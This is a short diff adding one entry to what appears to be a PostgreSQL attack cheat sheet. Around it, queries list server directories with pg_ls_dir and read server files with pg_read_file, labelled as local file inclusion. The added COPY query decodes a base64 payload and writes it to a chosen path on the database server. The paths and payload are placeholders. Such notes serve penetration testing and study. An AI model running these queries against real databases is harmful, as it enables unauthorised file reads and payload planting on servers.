@@ -3172,6 +3172,9 @@ SELECT * FROM pg_ls_dir('/path/to/folder_here');
 
 # LFI file read (file system)
 SELECT * FROM pg_read_file('/path/to/file_here', 0, 1000000);
+
+# write (text) file to disk
+copy (select convert_from(decode('b64_encoded_payload_here','base64'),'utf-8')) to '/path/to/outfile';
 ```
 
 
